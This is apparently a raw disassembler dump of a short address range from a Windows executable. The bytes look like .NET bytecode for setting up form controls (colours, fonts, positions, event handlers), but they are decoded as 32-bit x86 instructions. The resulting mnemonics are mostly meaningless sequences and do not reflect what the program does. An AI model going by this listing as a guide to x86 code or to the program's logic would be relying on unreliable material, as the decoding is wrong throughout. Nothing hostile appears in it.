  404493:	02 7b 1e             	add    0x1e(%ebx),%bh
  404496:	00 00                	add    %al,(%eax)
  404498:	04 16                	add    $0x16,%al
  40449a:	6f                   	outsl  %ds:(%esi),(%dx)
  40449b:	43                   	inc    %ebx
  40449c:	00 00                	add    %al,(%eax)
  40449e:	0a 00                	or     (%eax),%al
  4044a0:	02 7b 1e             	add    0x1e(%ebx),%bh
  4044a3:	00 00                	add    %al,(%eax)
  4044a5:	04 72                	add    $0x72,%al
  4044a7:	eb 01                	jmp    0x4044aa
  4044a9:	00 70 22             	add    %dh,0x22(%eax)
  4044ac:	00 00                	add    %al,(%eax)
  4044ae:	10 41 16             	adc    %al,0x16(%ecx)
  4044b1:	19 20                	sbb    %esp,(%eax)
  4044b3:	a2 00 00 00 73       	mov    %al,0x73000000
  4044b8:	44                   	inc    %esp
  4044b9:	00 00                	add    %al,(%eax)
  4044bb:	0a 6f 45             	or     0x45(%edi),%ch
  4044be:	00 00                	add    %al,(%eax)
  4044c0:	0a 00                	or     (%eax),%al
  4044c2:	02 7b 1e             	add    0x1e(%ebx),%bh
  4044c5:	00 00                	add    %al,(%eax)
  4044c7:	04 20                	add    $0x20,%al
  4044c9:	f9                   	stc
  4044ca:	00 00                	add    %al,(%eax)
  4044cc:	00 20                	add    %ah,(%eax)
  4044ce:	de 00                	fiadds (%eax)
  4044d0:	00 00                	add    %al,(%eax)
  4044d2:	20 c9                	and    %cl,%cl
  4044d4:	00 00                	add    %al,(%eax)
  4044d6:	00 28                	add    %ch,(%eax)
  4044d8:	32 00                	xor    (%eax),%al
  4044da:	00 0a                	add    %cl,(%edx)
  4044dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4044dd:	46                   	inc    %esi
  4044de:	00 00                	add    %al,(%eax)
  4044e0:	0a 00                	or     (%eax),%al
  4044e2:	02 7b 1e             	add    0x1e(%ebx),%bh
  4044e5:	00 00                	add    %al,(%eax)
  4044e7:	04 1f                	add    $0x1f,%al
  4044e9:	18 1f                	sbb    %bl,(%edi)
  4044eb:	63 73 35             	arpl   %esi,0x35(%ebx)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	0a 6f 36             	or     0x36(%edi),%ch
  4044f3:	00 00                	add    %al,(%eax)
  4044f5:	0a 00                	or     (%eax),%al
  4044f7:	02 7b 1e             	add    0x1e(%ebx),%bh
  4044fa:	00 00                	add    %al,(%eax)
  4044fc:	04 72                	add    $0x72,%al
  4044fe:	d5 04                	aad    $0x4
  404500:	00 70 6f             	add    %dh,0x6f(%eax)
  404503:	37                   	aaa
  404504:	00 00                	add    %al,(%eax)
  404506:	0a 00                	or     (%eax),%al
  404508:	02 7b 1e             	add    0x1e(%ebx),%bh
  40450b:	00 00                	add    %al,(%eax)
  40450d:	04 1f                	add    $0x1f,%al
  40450f:	73 1f                	jae    0x404530
  404511:	1b 73 38             	sbb    0x38(%ebx),%esi
  404514:	00 00                	add    %al,(%eax)
  404516:	0a 6f 39             	or     0x39(%edi),%ch
  404519:	00 00                	add    %al,(%eax)
  40451b:	0a 00                	or     (%eax),%al
  40451d:	02 7b 1e             	add    0x1e(%ebx),%bh
  404520:	00 00                	add    %al,(%eax)
  404522:	04 1f                	add    $0x1f,%al
  404524:	0e                   	push   %cs
  404525:	6f                   	outsl  %ds:(%esi),(%dx)
  404526:	3a 00                	cmp    (%eax),%al
  404528:	00 0a                	add    %cl,(%edx)
  40452a:	00 02                	add    %al,(%edx)
  40452c:	7b 1e                	jnp    0x40454c
  40452e:	00 00                	add    %al,(%eax)
  404530:	04 72                	add    $0x72,%al
  404532:	e7 04                	out    %eax,$0x4
  404534:	00 70 6f             	add    %dh,0x6f(%eax)
  404537:	47                   	inc    %edi
  404538:	00 00                	add    %al,(%eax)
  40453a:	0a 00                	or     (%eax),%al
  40453c:	02 7b 1e             	add    0x1e(%ebx),%bh
  40453f:	00 00                	add    %al,(%eax)
  404541:	04 18                	add    $0x18,%al
  404543:	6f                   	outsl  %ds:(%esi),(%dx)
  404544:	50                   	push   %eax
  404545:	00 00                	add    %al,(%eax)
  404547:	0a 00                	or     (%eax),%al
  404549:	02 7b 1e             	add    0x1e(%ebx),%bh
  40454c:	00 00                	add    %al,(%eax)
  40454e:	04 16                	add    $0x16,%al
  404550:	6f                   	outsl  %ds:(%esi),(%dx)
  404551:	48                   	dec    %eax
  404552:	00 00                	add    %al,(%eax)
  404554:	0a 00                	or     (%eax),%al
  404556:	02 7b 1e             	add    0x1e(%ebx),%bh
  404559:	00 00                	add    %al,(%eax)
  40455b:	04 02                	add    $0x2,%al
  40455d:	fe 06                	incb   (%esi)
  40455f:	0b 00                	or     (%eax),%eax
  404561:	00 06                	add    %al,(%esi)
  404563:	73 49                	jae    0x4045ae
  404565:	00 00                	add    %al,(%eax)
  404567:	0a 6f 4a             	or     0x4a(%edi),%ch
  40456a:	00 00                	add    %al,(%eax)
  40456c:	0a 00                	or     (%eax),%al
  40456e:	02 7b 1f             	add    0x1f(%ebx),%bh
  404571:	00 00                	add    %al,(%eax)
  404573:	04 17                	add    $0x17,%al
  404575:	6f                   	outsl  %ds:(%esi),(%dx)
  404576:	3e 00 00             	add    %al,%ds:(%eax)
  404579:	0a 00                	or     (%eax),%al
  40457b:	02 7b 1f             	add    0x1f(%ebx),%bh
  40457e:	00 00                	add    %al,(%eax)
  404580:	04 20                	add    $0x20,%al
  404582:	d8 00                	fadds  (%eax)
  404584:	00 00                	add    %al,(%eax)
  404586:	16                   	push   %ss
  404587:	1f                   	pop    %ds
  404588:	32 28                	xor    (%eax),%ch
  40458a:	32 00                	xor    (%eax),%al
  40458c:	00 0a                	add    %cl,(%edx)
  40458e:	6f                   	outsl  %ds:(%esi),(%dx)
  40458f:	33 00                	xor    (%eax),%eax
  404591:	00 0a                	add    %cl,(%edx)
  404593:	00 02                	add    %al,(%edx)
  404595:	7b 1f                	jnp    0x4045b6
  404597:	00 00                	add    %al,(%eax)
  404599:	04 6f                	add    $0x6f,%al
  40459b:	3f                   	aas
  40459c:	00 00                	add    %al,(%eax)
  40459e:	0a 20                	or     (%eax),%ah
  4045a0:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  4045a6:	00 00                	add    %al,(%eax)
  4045a8:	00 20                	add    %ah,(%eax)
  4045aa:	a2 00 00 00 28       	mov    %al,0x28000000
  4045af:	32 00                	xor    (%eax),%al
  4045b1:	00 0a                	add    %cl,(%edx)
  4045b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b4:	40                   	inc    %eax
  4045b5:	00 00                	add    %al,(%eax)
  4045b7:	0a 00                	or     (%eax),%al
  4045b9:	02 7b 1f             	add    0x1f(%ebx),%bh
  4045bc:	00 00                	add    %al,(%eax)
  4045be:	04 6f                	add    $0x6f,%al
  4045c0:	3f                   	aas
  4045c1:	00 00                	add    %al,(%eax)
  4045c3:	0a 20                	or     (%eax),%ah
  4045c5:	d8 00                	fadds  (%eax)
  4045c7:	00 00                	add    %al,(%eax)
  4045c9:	16                   	push   %ss
  4045ca:	1f                   	pop    %ds
  4045cb:	32 28                	xor    (%eax),%ch
  4045cd:	32 00                	xor    (%eax),%al
  4045cf:	00 0a                	add    %cl,(%edx)
  4045d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045d2:	41                   	inc    %ecx
  4045d3:	00 00                	add    %al,(%eax)
  4045d5:	0a 00                	or     (%eax),%al
  4045d7:	02 7b 1f             	add    0x1f(%ebx),%bh
  4045da:	00 00                	add    %al,(%eax)
  4045dc:	04 6f                	add    $0x6f,%al
  4045de:	3f                   	aas
  4045df:	00 00                	add    %al,(%eax)
  4045e1:	0a 20                	or     (%eax),%ah
  4045e3:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  4045e9:	00 00                	add    %al,(%eax)
  4045eb:	00 20                	add    %ah,(%eax)
  4045ed:	a2 00 00 00 28       	mov    %al,0x28000000
  4045f2:	32 00                	xor    (%eax),%al
  4045f4:	00 0a                	add    %cl,(%edx)
  4045f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f7:	42                   	inc    %edx
  4045f8:	00 00                	add    %al,(%eax)
  4045fa:	0a 00                	or     (%eax),%al
  4045fc:	02 7b 1f             	add    0x1f(%ebx),%bh
  4045ff:	00 00                	add    %al,(%eax)
  404601:	04 16                	add    $0x16,%al
  404603:	6f                   	outsl  %ds:(%esi),(%dx)
  404604:	43                   	inc    %ebx
  404605:	00 00                	add    %al,(%eax)
  404607:	0a 00                	or     (%eax),%al
  404609:	02 7b 1f             	add    0x1f(%ebx),%bh
  40460c:	00 00                	add    %al,(%eax)
  40460e:	04 72                	add    $0x72,%al
  404610:	eb 01                	jmp    0x404613
  404612:	00 70 22             	add    %dh,0x22(%eax)
  404615:	00 00                	add    %al,(%eax)
  404617:	10 41 16             	adc    %al,0x16(%ecx)
  40461a:	19 20                	sbb    %esp,(%eax)
  40461c:	a2 00 00 00 73       	mov    %al,0x73000000
  404621:	44                   	inc    %esp
  404622:	00 00                	add    %al,(%eax)
  404624:	0a 6f 45             	or     0x45(%edi),%ch
  404627:	00 00                	add    %al,(%eax)
  404629:	0a 00                	or     (%eax),%al
  40462b:	02 7b 1f             	add    0x1f(%ebx),%bh
  40462e:	00 00                	add    %al,(%eax)
  404630:	04 20                	add    $0x20,%al
  404632:	f9                   	stc
  404633:	00 00                	add    %al,(%eax)
  404635:	00 20                	add    %ah,(%eax)
  404637:	de 00                	fiadds (%eax)
  404639:	00 00                	add    %al,(%eax)
  40463b:	20 c9                	and    %cl,%cl
  40463d:	00 00                	add    %al,(%eax)
  40463f:	00 28                	add    %ch,(%eax)
  404641:	32 00                	xor    (%eax),%al
  404643:	00 0a                	add    %cl,(%edx)
  404645:	6f                   	outsl  %ds:(%esi),(%dx)
  404646:	46                   	inc    %esi
  404647:	00 00                	add    %al,(%eax)
  404649:	0a 00                	or     (%eax),%al
  40464b:	02 7b 1f             	add    0x1f(%ebx),%bh
  40464e:	00 00                	add    %al,(%eax)
  404650:	04 1f                	add    $0x1f,%al
  404652:	17                   	pop    %ss
  404653:	1f                   	pop    %ds
  404654:	42                   	inc    %edx
  404655:	73 35                	jae    0x40468c
  404657:	00 00                	add    %al,(%eax)
  404659:	0a 6f 36             	or     0x36(%edi),%ch
  40465c:	00 00                	add    %al,(%eax)
  40465e:	0a 00                	or     (%eax),%al
  404660:	02 7b 1f             	add    0x1f(%ebx),%bh
  404663:	00 00                	add    %al,(%eax)
  404665:	04 72                	add    $0x72,%al
  404667:	09 05 00 70 6f 37    	or     %eax,0x376f7000
  40466d:	00 00                	add    %al,(%eax)
  40466f:	0a 00                	or     (%eax),%al
  404671:	02 7b 1f             	add    0x1f(%ebx),%bh
  404674:	00 00                	add    %al,(%eax)
  404676:	04 1f                	add    $0x1f,%al
  404678:	75 1f                	jne    0x404699
  40467a:	1b 73 38             	sbb    0x38(%ebx),%esi
  40467d:	00 00                	add    %al,(%eax)
  40467f:	0a 6f 39             	or     0x39(%edi),%ch
  404682:	00 00                	add    %al,(%eax)
  404684:	0a 00                	or     (%eax),%al
  404686:	02 7b 1f             	add    0x1f(%ebx),%bh
  404689:	00 00                	add    %al,(%eax)
  40468b:	04 1f                	add    $0x1f,%al
  40468d:	0d 6f 3a 00 00       	or     $0x3a6f,%eax
  404692:	0a 00                	or     (%eax),%al
  404694:	02 7b 1f             	add    0x1f(%ebx),%bh
  404697:	00 00                	add    %al,(%eax)
  404699:	04 72                	add    $0x72,%al
  40469b:	1b 05 00 70 6f 47    	sbb    0x476f7000,%eax
  4046a1:	00 00                	add    %al,(%eax)
  4046a3:	0a 00                	or     (%eax),%al
  4046a5:	02 7b 1f             	add    0x1f(%ebx),%bh
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	04 18                	add    $0x18,%al
  4046ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ad:	50                   	push   %eax
  4046ae:	00 00                	add    %al,(%eax)
  4046b0:	0a 00                	or     (%eax),%al
  4046b2:	02 7b 1f             	add    0x1f(%ebx),%bh
  4046b5:	00 00                	add    %al,(%eax)
  4046b7:	04 16                	add    $0x16,%al
  4046b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ba:	48                   	dec    %eax
  4046bb:	00 00                	add    %al,(%eax)
  4046bd:	0a 00                	or     (%eax),%al
  4046bf:	02 7b 1f             	add    0x1f(%ebx),%bh
  4046c2:	00 00                	add    %al,(%eax)
  4046c4:	04 02                	add    $0x2,%al
  4046c6:	fe 06                	incb   (%esi)
  4046c8:	0a 00                	or     (%eax),%al
  4046ca:	00 06                	add    %al,(%esi)
  4046cc:	73 49                	jae    0x404717
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	0a 6f 4a             	or     0x4a(%edi),%ch
  4046d3:	00 00                	add    %al,(%eax)
  4046d5:	0a 00                	or     (%eax),%al
  4046d7:	02 7b 20             	add    0x20(%ebx),%bh
  4046da:	00 00                	add    %al,(%eax)
  4046dc:	04 17                	add    $0x17,%al
  4046de:	6f                   	outsl  %ds:(%esi),(%dx)
  4046df:	3e 00 00             	add    %al,%ds:(%eax)
  4046e2:	0a 00                	or     (%eax),%al
  4046e4:	02 7b 20             	add    0x20(%ebx),%bh
  4046e7:	00 00                	add    %al,(%eax)
  4046e9:	04 20                	add    $0x20,%al
  4046eb:	d8 00                	fadds  (%eax)
  4046ed:	00 00                	add    %al,(%eax)
  4046ef:	16                   	push   %ss
  4046f0:	1f                   	pop    %ds
  4046f1:	32 28                	xor    (%eax),%ch
  4046f3:	32 00                	xor    (%eax),%al
  4046f5:	00 0a                	add    %cl,(%edx)
  4046f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4046f8:	33 00                	xor    (%eax),%eax
  4046fa:	00 0a                	add    %cl,(%edx)
  4046fc:	00 02                	add    %al,(%edx)
  4046fe:	7b 20                	jnp    0x404720
  404700:	00 00                	add    %al,(%eax)
  404702:	04 6f                	add    $0x6f,%al
  404704:	3f                   	aas
  404705:	00 00                	add    %al,(%eax)
  404707:	0a 20                	or     (%eax),%ah
  404709:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  40470f:	00 00                	add    %al,(%eax)
  404711:	00 20                	add    %ah,(%eax)
  404713:	a2 00 00 00 28       	mov    %al,0x28000000
  404718:	32 00                	xor    (%eax),%al
  40471a:	00 0a                	add    %cl,(%edx)
  40471c:	6f                   	outsl  %ds:(%esi),(%dx)
  40471d:	40                   	inc    %eax
  40471e:	00 00                	add    %al,(%eax)
  404720:	0a 00                	or     (%eax),%al
  404722:	02 7b 20             	add    0x20(%ebx),%bh
  404725:	00 00                	add    %al,(%eax)
  404727:	04 6f                	add    $0x6f,%al
  404729:	3f                   	aas
  40472a:	00 00                	add    %al,(%eax)
  40472c:	0a 20                	or     (%eax),%ah
  40472e:	d8 00                	fadds  (%eax)
  404730:	00 00                	add    %al,(%eax)
  404732:	16                   	push   %ss
  404733:	1f                   	pop    %ds
  404734:	32 28                	xor    (%eax),%ch
  404736:	32 00                	xor    (%eax),%al
  404738:	00 0a                	add    %cl,(%edx)
  40473a:	6f                   	outsl  %ds:(%esi),(%dx)
  40473b:	41                   	inc    %ecx
  40473c:	00 00                	add    %al,(%eax)
  40473e:	0a 00                	or     (%eax),%al
  404740:	02 7b 20             	add    0x20(%ebx),%bh
  404743:	00 00                	add    %al,(%eax)
  404745:	04 6f                	add    $0x6f,%al
  404747:	3f                   	aas
  404748:	00 00                	add    %al,(%eax)
  40474a:	0a 20                	or     (%eax),%ah
  40474c:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  404752:	00 00                	add    %al,(%eax)
  404754:	00 20                	add    %ah,(%eax)
  404756:	a2 00 00 00 28       	mov    %al,0x28000000
  40475b:	32 00                	xor    (%eax),%al
  40475d:	00 0a                	add    %cl,(%edx)
  40475f:	6f                   	outsl  %ds:(%esi),(%dx)
  404760:	42                   	inc    %edx
  404761:	00 00                	add    %al,(%eax)
  404763:	0a 00                	or     (%eax),%al
  404765:	02 7b 20             	add    0x20(%ebx),%bh
  404768:	00 00                	add    %al,(%eax)
  40476a:	04 16                	add    $0x16,%al
  40476c:	6f                   	outsl  %ds:(%esi),(%dx)
  40476d:	43                   	inc    %ebx
  40476e:	00 00                	add    %al,(%eax)
  404770:	0a 00                	or     (%eax),%al
  404772:	02 7b 20             	add    0x20(%ebx),%bh
  404775:	00 00                	add    %al,(%eax)
  404777:	04 72                	add    $0x72,%al
  404779:	eb 01                	jmp    0x40477c
  40477b:	00 70 22             	add    %dh,0x22(%eax)
  40477e:	00 00                	add    %al,(%eax)
  404780:	10 41 16             	adc    %al,0x16(%ecx)
  404783:	19 20                	sbb    %esp,(%eax)
  404785:	a2 00 00 00 73       	mov    %al,0x73000000
  40478a:	44                   	inc    %esp
  40478b:	00 00                	add    %al,(%eax)
  40478d:	0a 6f 45             	or     0x45(%edi),%ch
  404790:	00 00                	add    %al,(%eax)
  404792:	0a 00                	or     (%eax),%al
  404794:	02 7b 20             	add    0x20(%ebx),%bh
  404797:	00 00                	add    %al,(%eax)
  404799:	04 20                	add    $0x20,%al
  40479b:	f9                   	stc
  40479c:	00 00                	add    %al,(%eax)
  40479e:	00 20                	add    %ah,(%eax)
  4047a0:	de 00                	fiadds (%eax)
  4047a2:	00 00                	add    %al,(%eax)
  4047a4:	20 c9                	and    %cl,%cl
  4047a6:	00 00                	add    %al,(%eax)
  4047a8:	00 28                	add    %ch,(%eax)
  4047aa:	32 00                	xor    (%eax),%al
  4047ac:	00 0a                	add    %cl,(%edx)
  4047ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4047af:	46                   	inc    %esi
  4047b0:	00 00                	add    %al,(%eax)
  4047b2:	0a 00                	or     (%eax),%al
  4047b4:	02 7b 20             	add    0x20(%ebx),%bh
  4047b7:	00 00                	add    %al,(%eax)
  4047b9:	04 1f                	add    $0x1f,%al
  4047bb:	22 1f                	and    (%edi),%bl
  4047bd:	21 73 35             	and    %esi,0x35(%ebx)
  4047c0:	00 00                	add    %al,(%eax)
  4047c2:	0a 6f 36             	or     0x36(%edi),%ch
  4047c5:	00 00                	add    %al,(%eax)
  4047c7:	0a 00                	or     (%eax),%al
  4047c9:	02 7b 20             	add    0x20(%ebx),%bh
  4047cc:	00 00                	add    %al,(%eax)
  4047ce:	04 72                	add    $0x72,%al
  4047d0:	3f                   	aas
  4047d1:	05 00 70 6f 37       	add    $0x376f7000,%eax
  4047d6:	00 00                	add    %al,(%eax)
  4047d8:	0a 00                	or     (%eax),%al
  4047da:	02 7b 20             	add    0x20(%ebx),%bh
  4047dd:	00 00                	add    %al,(%eax)
  4047df:	04 1f                	add    $0x1f,%al
  4047e1:	5f                   	pop    %edi
  4047e2:	1f                   	pop    %ds
  4047e3:	1b 73 38             	sbb    0x38(%ebx),%esi
  4047e6:	00 00                	add    %al,(%eax)
  4047e8:	0a 6f 39             	or     0x39(%edi),%ch
  4047eb:	00 00                	add    %al,(%eax)
  4047ed:	0a 00                	or     (%eax),%al
  4047ef:	02 7b 20             	add    0x20(%ebx),%bh
  4047f2:	00 00                	add    %al,(%eax)
  4047f4:	04 1f                	add    $0x1f,%al
  4047f6:	0c 6f                	or     $0x6f,%al
  4047f8:	3a 00                	cmp    (%eax),%al
  4047fa:	00 0a                	add    %cl,(%edx)
  4047fc:	00 02                	add    %al,(%edx)
  4047fe:	7b 20                	jnp    0x404820
  404800:	00 00                	add    %al,(%eax)
  404802:	04 72                	add    $0x72,%al
  404804:	51                   	push   %ecx
  404805:	05 00 70 6f 47       	add    $0x476f7000,%eax
  40480a:	00 00                	add    %al,(%eax)
  40480c:	0a 00                	or     (%eax),%al
  40480e:	02 7b 20             	add    0x20(%ebx),%bh
  404811:	00 00                	add    %al,(%eax)
  404813:	04 18                	add    $0x18,%al
  404815:	6f                   	outsl  %ds:(%esi),(%dx)
  404816:	50                   	push   %eax
  404817:	00 00                	add    %al,(%eax)
  404819:	0a 00                	or     (%eax),%al
  40481b:	02 7b 20             	add    0x20(%ebx),%bh
  40481e:	00 00                	add    %al,(%eax)
  404820:	04 16                	add    $0x16,%al
  404822:	6f                   	outsl  %ds:(%esi),(%dx)
  404823:	48                   	dec    %eax
  404824:	00 00                	add    %al,(%eax)
  404826:	0a 00                	or     (%eax),%al
  404828:	02 7b 20             	add    0x20(%ebx),%bh
  40482b:	00 00                	add    %al,(%eax)
  40482d:	04 02                	add    $0x2,%al
  40482f:	fe 06                	incb   (%esi)
  404831:	09 00                	or     %eax,(%eax)
  404833:	00 06                	add    %al,(%esi)
  404835:	73 49                	jae    0x404880
  404837:	00 00                	add    %al,(%eax)
  404839:	0a 6f 4a             	or     0x4a(%edi),%ch
  40483c:	00 00                	add    %al,(%eax)
  40483e:	0a 00                	or     (%eax),%al
  404840:	02 7b 10             	add    0x10(%ebx),%bh
  404843:	00 00                	add    %al,(%eax)
  404845:	04 17                	add    $0x17,%al
  404847:	6f                   	outsl  %ds:(%esi),(%dx)
  404848:	3e 00 00             	add    %al,%ds:(%eax)
  40484b:	0a 00                	or     (%eax),%al
  40484d:	02 7b 10             	add    0x10(%ebx),%bh
  404850:	00 00                	add    %al,(%eax)
  404852:	04 72                	add    $0x72,%al
  404854:	bb 03 00 70 22       	mov    $0x22700003,%ebx
  404859:	00 00                	add    %al,(%eax)
  40485b:	34 41                	xor    $0x41,%al
  40485d:	17                   	pop    %ss
  40485e:	19 20                	sbb    %esp,(%eax)
  404860:	a2 00 00 00 73       	mov    %al,0x73000000
  404865:	44                   	inc    %esp
  404866:	00 00                	add    %al,(%eax)
  404868:	0a 6f 45             	or     0x45(%edi),%ch
  40486b:	00 00                	add    %al,(%eax)
  40486d:	0a 00                	or     (%eax),%al
  40486f:	02 7b 10             	add    0x10(%ebx),%bh
  404872:	00 00                	add    %al,(%eax)
  404874:	04 20                	add    $0x20,%al
  404876:	f9                   	stc
  404877:	00 00                	add    %al,(%eax)
  404879:	00 20                	add    %ah,(%eax)
  40487b:	de 00                	fiadds (%eax)
  40487d:	00 00                	add    %al,(%eax)
  40487f:	20 c9                	and    %cl,%cl
  404881:	00 00                	add    %al,(%eax)
  404883:	00 28                	add    %ch,(%eax)
  404885:	32 00                	xor    (%eax),%al
  404887:	00 0a                	add    %cl,(%edx)
  404889:	6f                   	outsl  %ds:(%esi),(%dx)
  40488a:	46                   	inc    %esi
  40488b:	00 00                	add    %al,(%eax)
  40488d:	0a 00                	or     (%eax),%al
  40488f:	02 7b 10             	add    0x10(%ebx),%bh
  404892:	00 00                	add    %al,(%eax)
  404894:	04 1f                	add    $0x1f,%al
  404896:	2a 17                	sub    (%edi),%dl
  404898:	73 35                	jae    0x4048cf
  40489a:	00 00                	add    %al,(%eax)
  40489c:	0a 6f 36             	or     0x36(%edi),%ch
  40489f:	00 00                	add    %al,(%eax)
  4048a1:	0a 00                	or     (%eax),%al
  4048a3:	02 7b 10             	add    0x10(%ebx),%bh
  4048a6:	00 00                	add    %al,(%eax)
  4048a8:	04 72                	add    $0x72,%al
  4048aa:	6b 05 00 70 6f 37 00 	imul   $0x0,0x376f7000,%eax
  4048b1:	00 0a                	add    %cl,(%edx)
  4048b3:	00 02                	add    %al,(%edx)
  4048b5:	7b 10                	jnp    0x4048c7
  4048b7:	00 00                	add    %al,(%eax)
  4048b9:	04 1f                	add    $0x1f,%al
  4048bb:	4f                   	dec    %edi
  4048bc:	1f                   	pop    %ds
  4048bd:	12 73 38             	adc    0x38(%ebx),%dh
  4048c0:	00 00                	add    %al,(%eax)
  4048c2:	0a 6f 39             	or     0x39(%edi),%ch
  4048c5:	00 00                	add    %al,(%eax)
  4048c7:	0a 00                	or     (%eax),%al
  4048c9:	02 7b 10             	add    0x10(%ebx),%bh
  4048cc:	00 00                	add    %al,(%eax)
  4048ce:	04 1e                	add    $0x1e,%al
  4048d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4048d1:	3a 00                	cmp    (%eax),%al
  4048d3:	00 0a                	add    %cl,(%edx)
  4048d5:	00 02                	add    %al,(%edx)
  4048d7:	7b 10                	jnp    0x4048e9
  4048d9:	00 00                	add    %al,(%eax)
  4048db:	04 72                	add    $0x72,%al
  4048dd:	79 05                	jns    0x4048e4
  4048df:	00 70 6f             	add    %dh,0x6f(%eax)
  4048e2:	47                   	inc    %edi
  4048e3:	00 00                	add    %al,(%eax)
  4048e5:	0a 00                	or     (%eax),%al
  4048e7:	02 7b 11             	add    0x11(%ebx),%bh
  4048ea:	00 00                	add    %al,(%eax)
  4048ec:	04 17                	add    $0x17,%al
  4048ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4048ef:	4d                   	dec    %ebp
  4048f0:	00 00                	add    %al,(%eax)
  4048f2:	0a 00                	or     (%eax),%al
